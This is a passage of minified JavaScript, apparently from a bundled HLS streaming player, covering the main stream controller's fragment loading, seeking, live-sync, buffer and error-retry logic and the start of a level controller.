                                    i = this.fragmentTracker; if (!t.live && r && !r.backtracked && r.sn === t.endSN && !e.nextStart) { var n = i.getState(r); return n === Lt.PARTIAL || n === Lt.OK } return !1 }, r.onMediaSeeking = function() { var e = this.config,
                                    t = this.media,
                                    r = this.mediaBuffer,
                                    i = this.state,
                                    n = t ? t.currentTime : null,
                                    a = Mt.bufferInfo(r || t, n, this.config.maxBufferHole); if (et.logger.log("media seeking to " + (Object(Ze.isFiniteNumber)(n) ? n.toFixed(3) : n)), i === Yt.FRAG_LOADING) { var s = this.fragCurrent; if (0 === a.len && s) { var o = e.maxFragLookUpTolerance,
                                            l = s.start - o,
                                            u = s.start + s.duration + o;
                                        n < l || n > u ? (s.loader && (et.logger.log("seeking outside of buffer while fragment load in progress, cancel fragment load"), s.loader.abort()), this.fragCurrent = null, this.fragPrevious = null, this.state = Yt.IDLE) : et.logger.log("seeking outside of buffer but within currently loaded fragment range") } } else i === Yt.ENDED && (0 === a.len && (this.fragPrevious = null, this.fragCurrent = null), this.state = Yt.IDLE);
                                t && (this.lastCurrentTime = n), this.loadedmetadata || (this.nextLoadPosition = this.startPosition = n), this.tick() }, r.onMediaEnded = function() { this.startPosition = this.lastCurrentTime = 0 }, r.onHandlerDestroying = function() { this.stopLoad(), e.prototype.onHandlerDestroying.call(this) }, r.onHandlerDestroyed = function() { this.state = Yt.STOPPED, this.fragmentTracker = null }, r.computeLivePosition = function(e, t) { var r = void 0 !== this.config.liveSyncDuration ? this.config.liveSyncDuration : this.config.liveSyncDurationCount * t.targetduration; return e + Math.max(0, t.totalduration - r) }, t }(zt),
                        Jt = function(e) {
                            function t(t, r) { var i; return i = e.call(this, t, $e.default.MEDIA_ATTACHED, $e.default.MEDIA_DETACHING, $e.default.MANIFEST_LOADING, $e.default.MANIFEST_PARSED, $e.default.LEVEL_LOADED, $e.default.LEVELS_UPDATED, $e.default.KEY_LOADED, $e.default.FRAG_LOADED, $e.default.FRAG_LOAD_EMERGENCY_ABORTED, $e.default.FRAG_PARSING_INIT_SEGMENT, $e.default.FRAG_PARSING_DATA, $e.default.FRAG_PARSED, $e.default.ERROR, $e.default.AUDIO_TRACK_SWITCHING, $e.default.AUDIO_TRACK_SWITCHED, $e.default.BUFFER_CREATED, $e.default.BUFFER_APPENDED, $e.default.BUFFER_FLUSHED) || this, i.fragmentTracker = r, i.config = t.config, i.audioCodecSwap = !1, i._state = Yt.STOPPED, i.stallReported = !1, i.gapController = null, i.altAudio = !1, i.audioOnly = !1, i.bitrateTest = !1, i }
                            H(t, e); var r = t.prototype; return r.startLoad = function(e) { if (this.levels) { var t = this.lastCurrentTime,
                                        r = this.hls; if (this.stopLoad(), this.setInterval(100), this.level = -1, this.fragLoadError = 0, !this.startFragRequested) { var i = r.startLevel; - 1 === i && (r.config.testBandwidth ? (i = 0, this.bitrateTest = !0) : i = r.nextAutoLevel), this.level = r.nextLoadLevel = i, this.loadedmetadata = !1 }
                                    t > 0 && -1 === e && (et.logger.log("override startPosition with lastCurrentTime @" + t.toFixed(3)), e = t), this.state = Yt.IDLE, this.nextLoadPosition = this.startPosition = this.lastCurrentTime = e, this.tick() } else this.forceStartLoad = !0, this.state = Yt.STOPPED }, r.stopLoad = function() { this.forceStartLoad = !1, e.prototype.stopLoad.call(this) }, r.doTick = function() { switch (this.state) {
                                    case Yt.BUFFER_FLUSHING:
                                        this.fragLoadError = 0; break;
                                    case Yt.IDLE:
                                        this._doTickIdle(); break;
                                    case Yt.WAITING_LEVEL:
                                        var e = this.levels[this.level];
                                        e && e.details && (this.state = Yt.IDLE); break;
                                    case Yt.FRAG_LOADING_WAITING_RETRY:
                                        var t = window.performance.now(),
                                            r = this.retryDate;
                                        (!r || t >= r || this.media && this.media.seeking) && (et.logger.log("mediaController: retryDate reached, switch back to IDLE state"), this.state = Yt.IDLE); break;
                                    case Yt.ERROR:
                                    case Yt.STOPPED:
                                    case Yt.FRAG_LOADING:
                                    case Yt.PARSING:
                                    case Yt.PARSED:
                                    case Yt.ENDED:
                                }
                                this._checkBuffer(), this._checkFragmentChanged() }, r._doTickIdle = function() { var e = this.hls,
                                    t = e.config,
                                    r = this.media; if (void 0 !== this.levelLastLoaded && (r || !this.startFragRequested && t.startFragPrefetch)) { if (this.altAudio && this.audioOnly) return void(this.demuxer.frag = null); var i;
                                    i = this.loadedmetadata ? r.currentTime : this.nextLoadPosition; var n = e.nextLoadLevel,
                                        a = this.levels[n]; if (a) { var s, o = a.bitrate;
                                        s = o ? Math.max(8 * t.maxBufferSize / o, t.maxBufferLength) : t.maxBufferLength, s = Math.min(s, t.maxMaxBufferLength); var l = i < t.maxBufferHole ? Math.max(2, t.maxBufferHole) : t.maxBufferHole,
                                            u = Mt.bufferInfo(this.mediaBuffer ? this.mediaBuffer : r, i, l),
                                            c = u.len; if (!(c >= s)) { et.logger.trace("buffer length of " + c.toFixed(3) + " is below max of " + s.toFixed(3) + ". checking for more payload ..."), this.level = e.nextLoadLevel = n; var d = a.details; if (!d || d.live && this.levelLastLoaded !== n) return void(this.state = Yt.WAITING_LEVEL); if (this._streamEnded(u, d)) { var f = {}; return this.altAudio && (f.type = "video"), this.hls.trigger($e.default.BUFFER_EOS, f), void(this.state = Yt.ENDED) }
                                            this._fetchPayloadOrEos(i, u, d) } } } }, r._fetchPayloadOrEos = function(e, t, r) { var i = this.fragPrevious,
                                    n = (this.level, r.fragments),
                                    a = n.length; if (0 !== a) { var s, o = n[0].start,
                                        l = n[a - 1].start + n[a - 1].duration,
                                        u = t.end; if (r.initSegment && !r.initSegment.data) s = r.initSegment;
                                    else if (r.live) { var c = this.config.initialLiveManifestSize; if (a < c) return void et.logger.warn("Can not start playback of a level, reason: not enough fragments " + a + " < " + c); if (null === (s = this._ensureFragmentAtLivePoint(r, u, o, l, i, n))) return } else u < o && (s = n[0]);
                                    s || (s = this._findFragment(o, i, a, n, u, l, r)), s && (s.encrypted ? this._loadKey(s, r) : this._loadFragment(s, r, e, u)) } }, r._ensureFragmentAtLivePoint = function(e, t, r, i, n, a) { var s, o = this.hls.config,
                                    l = this.media,
                                    u = 1 / 0; if (void 0 !== o.liveMaxLatencyDuration ? u = o.liveMaxLatencyDuration : Object(Ze.isFiniteNumber)(o.liveMaxLatencyDurationCount) && (u = o.liveMaxLatencyDurationCount * e.targetduration), t < Math.max(r - o.maxFragLookUpTolerance, i - u)) { var c = this.liveSyncPosition = this.computeLivePosition(r, e);
                                    t = c, l && !l.paused && l.readyState && l.duration > c && c > l.currentTime && (et.logger.log("buffer end: " + t.toFixed(3) + " is located too far from the end of live sliding playlist, reset currentTime to : " + c.toFixed(3)), l.currentTime = c), this.nextLoadPosition = c } if (e.PTSKnown && t > i && l && l.readyState) return null; if (this.startFragRequested && !e.PTSKnown && n)
                                    if (e.hasProgramDateTime) et.logger.log("live playlist, switching playlist, load frag with same PDT: " + n.programDateTime), s = x(a, n.endProgramDateTime, o.maxFragLookUpTolerance);
                                    else { var d = n.sn + 1; if (d >= e.startSN && d <= e.endSN) { var f = a[d - e.startSN];
                                            n.cc === f.cc && (s = f, et.logger.log("live playlist, switching playlist, load frag with next SN: " + s.sn)) }
                                        s || (s = Ot.search(a, function(e) { return n.cc - e.cc })) && et.logger.log("live playlist, switching playlist, load frag with same CC: " + s.sn) }
                                return s }, r._findFragment = function(e, t, r, i, n, a, s) { var o, l = this.hls.config; if (n < a) { o = N(t, i, n, n > a - l.maxFragLookUpTolerance ? 0 : l.maxFragLookUpTolerance) } else o = i[r - 1]; if (o) { var u = o.sn - s.startSN,
                                        c = t && o.level === t.level,
                                        d = i[u - 1],
                                        f = i[u + 1]; if (t && o.sn === t.sn)
                                        if (c && !o.backtracked)
                                            if (o.sn < s.endSN) { var h = t.deltaPTS;
                                                h && h > l.maxBufferHole && t.dropped && u ? (o = d, et.logger.warn("Previous fragment was dropped with large PTS gap between audio and video. Maybe fragment is not starting with a keyframe? Loading previous one to try to overcome this")) : (o = f, this.fragmentTracker.getState(o) !== Lt.OK && et.logger.log("Re-loading fragment with SN: " + o.sn)) } else o = null;
                                    else o.backtracked && (f && f.backtracked ? (et.logger.warn("Already backtracked from fragment " + f.sn + ", will not backtrack to fragment " + o.sn + ". Loading fragment " + f.sn), o = f) : (et.logger.warn("Loaded fragment with dropped frames, backtracking 1 segment to find a keyframe"), o.dropped = 0, d ? (o = d, o.backtracked = !0) : u && (o = null))) } return o }, r._loadKey = function(e, t) { et.logger.log("Loading key for " + e.sn + " of [" + t.startSN + "-" + t.endSN + "], level " + this.level), this.state = Yt.KEY_LOADING, this.hls.trigger($e.default.KEY_LOADING, { frag: e }) }, r._loadFragment = function(e, t, r, i) { var n = this.fragmentTracker.getState(e);
                                this.fragCurrent = e, "initSegment" !== e.sn && (this.startFragRequested = !0), Object(Ze.isFiniteNumber)(e.sn) && !e.bitrateTest && (this.nextLoadPosition = e.start + e.duration), e.backtracked || n === Lt.NOT_LOADED || n === Lt.PARTIAL ? (e.autoLevel = this.hls.autoLevelEnabled, e.bitrateTest = this.bitrateTest, et.logger.log("Loading " + e.sn + " of [" + t.startSN + "-" + t.endSN + "], level " + this.level + ", " + (this.loadedmetadata ? "currentTime" : "nextLoadPosition") + ": " + parseFloat(r.toFixed(3)) + ", bufferEnd: " + parseFloat(i.toFixed(3))), this.hls.trigger($e.default.FRAG_LOADING, { frag: e }), this.demuxer || (this.demuxer = new qt(this.hls, "main")), this.state = Yt.FRAG_LOADING) : n === Lt.APPENDING && this._reduceMaxBufferLength(e.duration) && this.fragmentTracker.removeFragment(e) }, r.getBufferedFrag = function(e) { return this.fragmentTracker.getBufferedFrag(e, nt.MAIN) }, r.followingBufferedFrag = function(e) { return e ? this.getBufferedFrag(e.endPTS + .5) : null }, r._checkFragmentChanged = function() { var e, t, r = this.media; if (r && r.readyState && !1 === r.seeking && (t = r.currentTime, t > this.lastCurrentTime && (this.lastCurrentTime = t), Mt.isBuffered(r, t) ? e = this.getBufferedFrag(t) : Mt.isBuffered(r, t + .1) && (e = this.getBufferedFrag(t + .1)), e)) { var i = e; if (i !== this.fragPlaying) { this.hls.trigger($e.default.FRAG_CHANGED, { frag: i }); var n = i.level;
                                        this.fragPlaying && this.fragPlaying.level === n || this.hls.trigger($e.default.LEVEL_SWITCHED, { level: n }), this.fragPlaying = i } } }, r.immediateLevelSwitch = function() { if (et.logger.log("immediateLevelSwitch"), !this.immediateSwitch) { this.immediateSwitch = !0; var e, t = this.media;
                                    t ? (e = t.paused) || t.pause() : e = !0, this.previouslyPaused = e } var r = this.fragCurrent;
                                r && r.loader && r.loader.abort(), this.fragCurrent = null, this.flushMainBuffer(0, Number.POSITIVE_INFINITY) }, r.immediateLevelSwitchEnd = function() { var e = this.media;
                                e && e.buffered.length && (this.immediateSwitch = !1, e.currentTime > 0 && Mt.isBuffered(e, e.currentTime) && (e.currentTime -= 1e-4), this.previouslyPaused || e.play()) }, r.nextLevelSwitch = function() { var e = this.media; if (e && e.readyState) { var t, r = this.getBufferedFrag(e.currentTime); if (r && r.startPTS > 1 && this.flushMainBuffer(0, r.startPTS - 1), e.paused) t = 0;
                                    else { var i = this.hls.nextLoadLevel,
                                            n = this.levels[i],
                                            a = this.fragLastKbps;
                                        t = a && this.fragCurrent ? this.fragCurrent.duration * n.bitrate / (1e3 * a) + 1 : 0 } var s = this.getBufferedFrag(e.currentTime + t); if (s) { var o = this.followingBufferedFrag(s); if (o) { var l = this.fragCurrent;
                                            l && l.loader && l.loader.abort(), this.fragCurrent = null; var u = Math.max(s.endPTS, o.maxStartPTS + Math.min(this.config.maxFragLookUpTolerance, o.duration));
                                            this.flushMainBuffer(u, Number.POSITIVE_INFINITY) } } } }, r.flushMainBuffer = function(e, t) { this.state = Yt.BUFFER_FLUSHING; var r = { startOffset: e, endOffset: t };
                                this.altAudio && (r.type = "video"), this.hls.trigger($e.default.BUFFER_FLUSHING, r) }, r.onMediaAttached = function(e) { var t = this.media = this.mediaBuffer = e.media;
                                this.onvseeking = this.onMediaSeeking.bind(this), this.onvseeked = this.onMediaSeeked.bind(this), this.onvended = this.onMediaEnded.bind(this), t.addEventListener("seeking", this.onvseeking), t.addEventListener("seeked", this.onvseeked), t.addEventListener("ended", this.onvended); var r = this.config;
                                this.levels && r.autoStartLoad && this.hls.startLoad(r.startPosition), this.gapController = new Wt(r, t, this.fragmentTracker, this.hls) }, r.onMediaDetaching = function() { var e = this.media;
                                e && e.ended && (et.logger.log("MSE detaching and video ended, reset startPosition"), this.startPosition = this.lastCurrentTime = 0); var t = this.levels;
                                t && t.forEach(function(e) { e.details && e.details.fragments.forEach(function(e) { e.backtracked = void 0 }) }), e && (e.removeEventListener("seeking", this.onvseeking), e.removeEventListener("seeked", this.onvseeked), e.removeEventListener("ended", this.onvended), this.onvseeking = this.onvseeked = this.onvended = null), this.fragmentTracker.removeAllFragments(), this.media = this.mediaBuffer = null, this.loadedmetadata = !1, this.stopLoad() }, r.onMediaSeeked = function() { var e = this.media,
                                    t = e ? e.currentTime : void 0;
                                Object(Ze.isFiniteNumber)(t) && et.logger.log("media seeked to " + t.toFixed(3)), this.tick() }, r.onManifestLoading = function() { et.logger.log("trigger BUFFER_RESET"), this.hls.trigger($e.default.BUFFER_RESET), this.fragmentTracker.removeAllFragments(), this.stalled = !1, this.startPosition = this.lastCurrentTime = 0 }, r.onManifestParsed = function(e) { var t, r = !1,
                                    i = !1;
                                e.levels.forEach(function(e) {
                                    (t = e.audioCodec) && (-1 !== t.indexOf("mp4a.40.2") && (r = !0), -1 !== t.indexOf("mp4a.40.5") && (i = !0)) }), this.audioCodecSwitch = r && i, this.audioCodecSwitch && et.logger.log("both AAC/HE-AAC audio found in levels; declaring level codec as HE-AAC"), this.altAudio = e.altAudio, this.levels = e.levels, this.startFragRequested = !1; var n = this.config;
                                (n.autoStartLoad || this.forceStartLoad) && this.hls.startLoad(n.startPosition) }, r.onLevelLoaded = function(e) { var t = e.details,
                                    r = e.level,
                                    i = this.levels[this.levelLastLoaded],
                                    n = this.levels[r],
                                    a = t.totalduration,
                                    s = 0; if (et.logger.log("level " + r + " loaded [" + t.startSN + "," + t.endSN + "],duration:" + a), t.live || n.details && n.details.live) { var o = n.details;
                                    o && t.fragments.length > 0 ? (S(o, t), s = t.fragments[0].start, this.liveSyncPosition = this.computeLivePosition(s, o), t.PTSKnown && Object(Ze.isFiniteNumber)(s) ? et.logger.log("live playlist sliding:" + s.toFixed(3)) : (et.logger.log("live playlist - outdated PTS, unknown sliding"), I(this.fragPrevious, i, t))) : (et.logger.log("live playlist - first load, unknown sliding"), t.PTSKnown = !1, I(this.fragPrevious, i, t)) } else t.PTSKnown = !1; if (n.details = t, this.levelLastLoaded = r, this.hls.trigger($e.default.LEVEL_UPDATED, { details: t, level: r }), !1 === this.startFragRequested) { if (-1 === this.startPosition || -1 === this.lastCurrentTime) { var l = t.startTimeOffset;
                                        Object(Ze.isFiniteNumber)(l) ? (l < 0 && (et.logger.log("negative start time offset " + l + ", count from end of last fragment"), l = s + a + l), et.logger.log("start time offset found in playlist, adjust startPosition to " + l), this.startPosition = l) : t.live ? (this.startPosition = this.computeLivePosition(s, t), et.logger.log("configure startPosition to " + this.startPosition)) : this.startPosition = 0, this.lastCurrentTime = this.startPosition }
                                    this.nextLoadPosition = this.startPosition }
                                this.state === Yt.WAITING_LEVEL && (this.state = Yt.IDLE), this.tick() }, r.onKeyLoaded = function() { this.state === Yt.KEY_LOADING && (this.state = Yt.IDLE, this.tick()) }, r.onFragLoaded = function(e) { var t = this.fragCurrent,
                                    r = this.hls,
                                    i = this.levels,
                                    n = this.media,
                                    a = e.frag; if (this.state === Yt.FRAG_LOADING && t && "main" === a.type && a.level === t.level && a.sn === t.sn) { var s = e.stats,
                                        o = i[t.level],
                                        l = o.details; if (this.bitrateTest = !1, this.stats = s, et.logger.log("Loaded " + t.sn + " of [" + l.startSN + " ," + l.endSN + "],level " + t.level), a.bitrateTest && r.nextLoadLevel) this.state = Yt.IDLE, this.startFragRequested = !1, s.tparsed = s.tbuffered = window.performance.now(), r.trigger($e.default.FRAG_BUFFERED, { stats: s, frag: t, id: "main" }), this.tick();
                                    else if ("initSegment" === a.sn) this.state = Yt.IDLE, s.tparsed = s.tbuffered = window.performance.now(), l.initSegment.data = e.payload, r.trigger($e.default.FRAG_BUFFERED, { stats: s, frag: t, id: "main" }), this.tick();
                                    else { et.logger.log("Parsing " + t.sn + " of [" + l.startSN + " ," + l.endSN + "],level " + t.level + ", cc " + t.cc), this.state = Yt.PARSING, this.pendingBuffering = !0, this.appended = !1, a.bitrateTest && (a.bitrateTest = !1, this.fragmentTracker.onFragLoaded({ frag: a })); var u = !(n && n.seeking) && (l.PTSKnown || !l.live),
                                            c = l.initSegment ? l.initSegment.data : [],
                                            d = this._getAudioCodec(o),
                                            f = this.demuxer = this.demuxer || new qt(this.hls, "main");
                                        f.push(e.payload, c, d, o.videoCodec, t, l.totalduration, u) } }
                                this.fragLoadError = 0 }, r.onFragParsingInitSegment = function(e) { var t = this.fragCurrent,
                                    r = e.frag; if (t && "main" === e.id && r.sn === t.sn && r.level === t.level && this.state === Yt.PARSING) { var i, n, a = e.tracks; if (this.audioOnly = a.audio && !a.video, this.altAudio && !this.audioOnly && delete a.audio, n = a.audio) { var s = this.levels[this.level].audioCodec,
                                            o = navigator.userAgent.toLowerCase();
                                        s && this.audioCodecSwap && (et.logger.log("swapping playlist audio codec"), s = -1 !== s.indexOf("mp4a.40.5") ? "mp4a.40.2" : "mp4a.40.5"), this.audioCodecSwitch && 1 !== n.metadata.channelCount && -1 === o.indexOf("firefox") && (s = "mp4a.40.5"), -1 !== o.indexOf("android") && "audio/mpeg" !== n.container && (s = "mp4a.40.2", et.logger.log("Android: force audio codec to " + s)), n.levelCodec = s, n.id = e.id }
                                    n = a.video, n && (n.levelCodec = this.levels[this.level].videoCodec, n.id = e.id), this.hls.trigger($e.default.BUFFER_CODECS, a); for (i in a) { n = a[i], et.logger.log("main track:" + i + ",container:" + n.container + ",codecs[level/parsed]=[" + n.levelCodec + "/" + n.codec + "]"); var l = n.initSegment;
                                        l && (this.appended = !0, this.pendingBuffering = !0, this.hls.trigger($e.default.BUFFER_APPENDING, { type: i, data: l, parent: "main", content: "initSegment" })) }
                                    this.tick() } }, r.onFragParsingData = function(e) { var t = this,
                                    r = this.fragCurrent,
                                    i = e.frag; if (r && "main" === e.id && i.sn === r.sn && i.level === r.level && ("audio" !== e.type || !this.altAudio) && this.state === Yt.PARSING) { var n = this.levels[this.level],
                                        a = r; if (Object(Ze.isFiniteNumber)(e.endPTS) || (e.endPTS = e.startPTS + r.duration, e.endDTS = e.startDTS + r.duration), !0 === e.hasAudio && a.addElementaryStream(at.AUDIO), !0 === e.hasVideo && a.addElementaryStream(at.VIDEO), et.logger.log("Parsed " + e.type + ",PTS:[" + e.startPTS.toFixed(3) + "," + e.endPTS.toFixed(3) + "],DTS:[" + e.startDTS.toFixed(3) + "/" + e.endDTS.toFixed(3) + "],nb:" + e.nb + ",dropped:" + (e.dropped || 0)), "video" === e.type)
                                        if (a.dropped = e.dropped, a.dropped)
                                            if (a.backtracked) et.logger.warn("Already backtracked on this fragment, appending with the gap", a.sn);
                                            else { var s = n.details; if (!s || a.sn !== s.startSN) return et.logger.warn("missing video frame(s), backtracking fragment", a.sn), this.fragmentTracker.removeFragment(a), a.backtracked = !0, this.nextLoadPosition = e.startPTS, this.state = Yt.IDLE, this.fragPrevious = a, this.demuxer && (this.demuxer.destroy(), this.demuxer = null), void this.tick();
                                                et.logger.warn("missing video frame(s) on first frag, appending with gap", a.sn) }
                                    else a.backtracked = !1; var o = E(n.details, a, e.startPTS, e.endPTS, e.startDTS, e.endDTS),
                                        l = this.hls;
                                    l.trigger($e.default.LEVEL_PTS_UPDATED, { details: n.details, level: this.level, drift: o, type: e.type, start: e.startPTS, end: e.endPTS }), [e.data1, e.data2].forEach(function(r) { r && r.length && t.state === Yt.PARSING && (t.appended = !0, t.pendingBuffering = !0, l.trigger($e.default.BUFFER_APPENDING, { type: e.type, data: r, parent: "main", content: "data" })) }), this.tick() } }, r.onFragParsed = function(e) { var t = this.fragCurrent,
                                    r = e.frag;
                                t && "main" === e.id && r.sn === t.sn && r.level === t.level && this.state === Yt.PARSING && (this.stats.tparsed = window.performance.now(), this.state = Yt.PARSED, this._checkAppendedParsed()) }, r.onAudioTrackSwitching = function(e) { var t = this.altAudio,
                                    r = !!e.url,
                                    i = e.id; if (!r) { if (this.mediaBuffer !== this.media) { et.logger.log("switching on main audio, use media.buffered to schedule main fragment loading"), this.mediaBuffer = this.media; var n = this.fragCurrent;
                                        n.loader && (et.logger.log("switching to main audio track, cancel main fragment load"), n.loader.abort()), this.fragCurrent = null, this.fragPrevious = null, this.demuxer && (this.demuxer.destroy(), this.demuxer = null), this.state = Yt.IDLE } var a = this.hls;
                                    t && a.trigger($e.default.BUFFER_FLUSHING, { startOffset: 0, endOffset: Number.POSITIVE_INFINITY, type: "audio" }), a.trigger($e.default.AUDIO_TRACK_SWITCHED, { id: i }) } }, r.onAudioTrackSwitched = function(e) { var t = e.id,
                                    r = !!this.hls.audioTracks[t].url; if (r) { var i = this.videoBuffer;
                                    i && this.mediaBuffer !== i && (et.logger.log("switching on alternate audio, use video.buffered to schedule main fragment loading"), this.mediaBuffer = i) }
                                this.altAudio = r, this.tick() }, r.onBufferCreated = function(e) { var t, r, i = e.tracks,
                                    n = !1; for (var a in i) { var s = i[a]; "main" === s.id ? (r = a, t = s, "video" === a && (this.videoBuffer = i[a].buffer)) : n = !0 }
                                n && t ? (et.logger.log("alternate track found, use " + r + ".buffered to schedule main fragment loading"), this.mediaBuffer = t.buffer) : this.mediaBuffer = this.media }, r.onBufferAppended = function(e) { if ("main" === e.parent) { var t = this.state;
                                    t !== Yt.PARSING && t !== Yt.PARSED || (this.pendingBuffering = e.pending > 0, this._checkAppendedParsed()) } }, r._checkAppendedParsed = function() { if (!(this.state !== Yt.PARSED || this.appended && this.pendingBuffering)) { var e = this.fragCurrent; if (e) { var t = this.mediaBuffer ? this.mediaBuffer : this.media;
                                        et.logger.log("main buffered : " + Vt.toString(t.buffered)), this.fragPrevious = e; var r = this.stats;
                                        r.tbuffered = window.performance.now(), this.fragLastKbps = Math.round(8 * r.total / (r.tbuffered - r.tfirst)), this.hls.trigger($e.default.FRAG_BUFFERED, { stats: r, frag: e, id: "main" }), this.state = Yt.IDLE }(this.loadedmetadata || this.startPosition <= 0) && this.tick() } }, r.onError = function(e) { var t = e.frag || this.fragCurrent; if (!t || "main" === t.type) { var r = !!this.media && Mt.isBuffered(this.media, this.media.currentTime) && Mt.isBuffered(this.media, this.media.currentTime + .5); switch (e.details) {
                                        case Qe.ErrorDetails.FRAG_LOAD_ERROR:
                                        case Qe.ErrorDetails.FRAG_LOAD_TIMEOUT:
                                        case Qe.ErrorDetails.KEY_LOAD_ERROR:
                                        case Qe.ErrorDetails.KEY_LOAD_TIMEOUT:
                                            if (!e.fatal)
                                                if (this.fragLoadError + 1 <= this.config.fragLoadingMaxRetry) { var i = Math.min(Math.pow(2, this.fragLoadError) * this.config.fragLoadingRetryDelay, this.config.fragLoadingMaxRetryTimeout);
                                                    et.logger.warn("mediaController: frag loading failed, retry in " + i + " ms"), this.retryDate = window.performance.now() + i, this.loadedmetadata || (this.startFragRequested = !1, this.nextLoadPosition = this.startPosition), this.fragLoadError++, this.state = Yt.FRAG_LOADING_WAITING_RETRY } else et.logger.error("mediaController: " + e.details + " reaches max retry, redispatch as fatal ..."), e.fatal = !0, this.state = Yt.ERROR;
                                            break;
                                        case Qe.ErrorDetails.LEVEL_LOAD_ERROR:
                                        case Qe.ErrorDetails.LEVEL_LOAD_TIMEOUT:
                                            this.state !== Yt.ERROR && (e.fatal ? (this.state = Yt.ERROR, et.logger.warn("streamController: " + e.details + ",switch to " + this.state + " state ...")) : e.levelRetry || this.state !== Yt.WAITING_LEVEL || (this.state = Yt.IDLE)); break;
                                        case Qe.ErrorDetails.BUFFER_FULL_ERROR:
                                            "main" !== e.parent || this.state !== Yt.PARSING && this.state !== Yt.PARSED || (r ? (this._reduceMaxBufferLength(this.config.maxBufferLength), this.state = Yt.IDLE) : (et.logger.warn("buffer full error also media.currentTime is not buffered, flush everything"), this.fragCurrent = null, this.flushMainBuffer(0, Number.POSITIVE_INFINITY))) } } }, r._reduceMaxBufferLength = function(e) { var t = this.config; return t.maxMaxBufferLength >= e && (t.maxMaxBufferLength /= 2, et.logger.warn("main:reduce max buffer length to " + t.maxMaxBufferLength + "s"), !0) }, r._checkBuffer = function() { var e = this.media; if (e && 0 !== e.readyState) { var t = this.mediaBuffer ? this.mediaBuffer : e,
                                        r = t.buffered;!this.loadedmetadata && r.length ? (this.loadedmetadata = !0, this._seekToStartPos()) : this.immediateSwitch ? this.immediateLevelSwitchEnd() : this.gapController.poll(this.lastCurrentTime, r) } }, r.onFragLoadEmergencyAborted = function() { this.state = Yt.IDLE, this.loadedmetadata || (this.startFragRequested = !1, this.nextLoadPosition = this.startPosition), this.tick() }, r.onBufferFlushed = function() { var e = this.mediaBuffer ? this.mediaBuffer : this.media; if (e) { var t = this.audioOnly ? at.AUDIO : at.VIDEO;
                                    this.fragmentTracker.detectEvictedFragments(t, e.buffered) }
                                this.state = Yt.IDLE, this.fragPrevious = null }, r.onLevelsUpdated = function(e) { this.levels = e.levels }, r.swapAudioCodec = function() { this.audioCodecSwap = !this.audioCodecSwap }, r._seekToStartPos = function() { var e = this.media,
                                    t = e.currentTime,
                                    r = this.startPosition; if (t !== r && r >= 0) { if (e.seeking) return void et.logger.log("could not seek to " + r + ", already seeking at " + t); var i = e.buffered.length ? e.buffered.start(0) : 0,
                                        n = i - r;
                                    n > 0 && n < this.config.maxBufferHole && (et.logger.log("adjusting start position by " + n + " to match buffer start"), r += n, this.startPosition = r), et.logger.log("seek to target start position " + r + " from current time " + t + ". ready state " + e.readyState), e.currentTime = r } }, r._getAudioCodec = function(e) { var t = this.config.defaultAudioCodec || e.audioCodec; return this.audioCodecSwap && (et.logger.log("swapping playlist audio codec"), t && (t = -1 !== t.indexOf("mp4a.40.5") ? "mp4a.40.2" : "mp4a.40.5")), t }, q(t, [{ key: "state", set: function(e) { if (this.state !== e) { var t = this.state;
                                        this._state = e, et.logger.log("main stream-controller: " + t + "->" + e), this.hls.trigger($e.default.STREAM_STATE_TRANSITION, { previousState: t, nextState: e }) } }, get: function() { return this._state } }, { key: "currentLevel", get: function() { var e = this.media; if (e) { var t = this.getBufferedFrag(e.currentTime); if (t) return t.level } return -1 } }, { key: "nextBufferedFrag", get: function() { var e = this.media; return e ? this.followingBufferedFrag(this.getBufferedFrag(e.currentTime)) : null } }, { key: "nextLevel", get: function() { var e = this.nextBufferedFrag; return e ? e.level : -1 } }, { key: "liveSyncPosition", get: function() { return this._liveSyncPosition }, set: function(e) { this._liveSyncPosition = e } }]), t }(Xt),
                        Qt = Jt,
                        Zt = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.MANIFEST_LOADED, $e.default.LEVEL_LOADED, $e.default.AUDIO_TRACK_SWITCHED, $e.default.FRAG_LOADED, $e.default.ERROR) || this, r.canload = !1, r.currentLevelIndex = null, r.manualLevelIndex = -1, r.timer = null, lt = /chrome|firefox/.test(navigator.userAgent.toLowerCase()), r }
                            z(t, e); var r = t.prototype; return r.onHandlerDestroying = function() { this.clearTimer(), this.manualLevelIndex = -1 }, r.clearTimer = function() { null !== this.timer && (clearTimeout(this.timer), this.timer = null) }, r.startLoad = function() { var e = this._levels;
                                this.canload = !0, this.levelRetryCount = 0, e && e.forEach(function(e) { e.loadError = 0; var t = e.details;
                                    t && t.live && (e.details = void 0) }), null !== this.timer && this.loadLevel() }, r.stopLoad = function() { this.canload = !1 }, r.onManifestLoaded = function(e) { var t, r = [],
                                    i = [],
                                    n = {},
                                    a = null,
                                    s = !1,
                                    o = !1; if (e.levels.forEach(function(e) { var t = e.attrs;
                                        e.loadError = 0, e.fragmentError = !1, s = s || !!e.videoCodec, o = o || !!e.audioCodec, lt && e.audioCodec && -1 !== e.audioCodec.indexOf("mp4a.40.34") && (e.audioCodec = void 0), a = n[e.bitrate], a ? a.url.push(e.url) : (e.url = [e.url], e.urlId = 0, n[e.bitrate] = e, r.push(e)), t && (t.AUDIO && b(a || e, "audio", t.AUDIO), t.SUBTITLES && b(a || e, "text", t.SUBTITLES)) }), s && o && (r = r.filter(function(e) { return !!e.videoCodec })), r = r.filter(function(e) { var t = e.audioCodec,
                                            r = e.videoCodec; return (!t || c(t, "audio")) && (!r || c(r, "video")) }), e.audioTracks && (i = e.audioTracks.filter(function(e) { return !e.audioCodec || c(e.audioCodec, "audio") }), i.forEach(function(e, t) { e.id = t })), r.length > 0) { t = r[0].bitrate, r.sort(function(e, t) { return e.bitrate - t.bitrate }), this._levels = r; for (var l = 0; l < r.length; l++)
                                        if (r[l].bitrate === t) { this._firstLevel = l, et.logger.log("manifest loaded," + r.length + " level(s) found, first bitrate:" + t); break }
                                    var u = o && !s;
                                    this.hls.trigger($e.default.MANIFEST_PARSED, { levels: r, audioTracks: i, firstLevel: this._firstLevel, stats: e.stats, audio: o, video: s, altAudio: !u && i.some(function(e) { return !!e.url }) }) } else this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.MANIFEST_INCOMPATIBLE_CODECS_ERROR, fatal: !0, url: this.hls.url, reason: "no level with compatible codecs found in manifest" }) }, r.setLevelInternal = function(e) { var t = this._levels,
                                    r = this.hls; if (e >= 0 && e < t.length) { if (this.clearTimer(), this.currentLevelIndex !== e) { et.logger.log("switching to level " + e), this.currentLevelIndex = e; var i = t[e];
